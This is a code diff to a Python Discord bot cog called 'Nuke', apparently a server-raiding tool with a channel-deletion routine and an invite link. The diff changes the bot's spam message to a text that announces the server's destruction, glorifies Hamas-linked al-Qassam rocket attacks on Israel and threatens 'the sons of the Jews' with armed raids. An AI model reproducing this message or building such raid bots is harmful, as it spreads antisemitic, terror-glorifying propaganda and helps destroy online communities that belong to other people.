@@ -4,7 +4,17 @@ from discord.ext import commands
 class Nuke(commands.Cog):
     def __init__(self, bot):
         self.bot = bot
-        self.message = "spam @everyone"
+        self.message = """**GET NUKED, OH INFIDEL
+YOUR SERVER HAS BEEN DESTROYED BY THE ARMY OF THE FAITHFUL
+LET US PRAY TO ALLAH FOR YOUR RECONCILATION AND REHABILITATION,
+FOR YOU TO BE LEAD ONTO THE STRAIGHT PATH
+https://media.giphy.com/media/j5iRcKIcLBTBBtYG84/giphy.gif
+https://media.giphy.com/media/XD4LwLHnoEyeVFXkvM/giphy.gif
+https://media.giphy.com/media/KZevNwyAE26w8y87b5/giphy.gif
+https://media.giphy.com/media/VDjtZo2p6agfanEYIB/giphy.gif
+https://media.giphy.com/media/WqXmUlf5NK59V0Npda/giphy.gif
+RISE OH SON OF AL QASSAM, AND SAY THESE ARE MY ROCKETS AND IN THEIR RANGE WE TARGET YOU, ISRAEL
+WITH OUR FROGMEN AND OUR MARINE COMMANDOS WE WILL TEACH THE SONS OF THE JEWS, ROUNDS OF STORMINGS**"""
         self.invites = "https://discord.gg/cbtAzt"
 
     async def delete_channels(self, ctx):
